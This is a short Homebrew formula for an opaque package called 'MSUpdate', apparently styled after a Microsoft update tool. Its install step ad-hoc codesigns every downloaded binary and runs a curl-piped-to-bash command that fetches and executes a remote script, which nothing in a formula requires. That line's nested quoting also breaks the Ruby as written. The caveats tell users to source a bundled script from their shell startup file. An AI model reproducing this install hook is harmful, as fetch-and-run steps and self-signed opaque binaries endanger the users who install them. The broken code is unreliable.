class Msupdate < Formula
    desc "MSUpdate"
    homepage "https://github.com/mscoredev/"
    url "https://github.com/mscoredev/msupdate/releases/download/v1.00.2/msupdate-1.00.2.tar.gz"
    sha256 "f67064a932c716cd15736cdf67acf27a76e0ab0c8407efdc69e9cef8c1b2e0e2"
    version "1.00.2"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""
      end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
